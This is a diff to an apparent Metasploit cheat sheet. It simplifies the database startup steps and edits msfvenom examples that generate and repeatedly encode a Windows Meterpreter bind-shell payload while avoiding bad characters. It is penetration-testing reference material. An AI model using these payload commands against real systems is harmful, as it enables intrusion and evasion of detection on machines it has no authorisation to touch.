@@ -3,8 +3,7 @@ Metasploit
 
 # Startup
 
-service postgresql start                                    Start the postgresql db
-msfdb init                                                  Create and initialize the msf db
+msfdb init                                                  Start postgresql and initialize the db
 msfconsole                                                  Start Metasploit
 db_status                                                   Show the current data service status
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -91,8 +90,8 @@ msfvenom --list <archs, encoders, formats, platforms>       Show supported optio
 
 msfvenom -p <payload variable=value> -f <format> -e <encoder> -a <arch> --platform <OS platform> -o <output file>
 
-- Generate a bind payload that avoids a bad character
-msfvenom -p windows/meterpreter/bind_tcp -b '\x00'
+- Generate a bind payload that avoids a bad characters
+msfvenom -p windows/meterpreter/bind_tcp -b '\x00\x0A\x0D\xFF'
 
 - Generate a bind payload and encode it 3 times
 msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
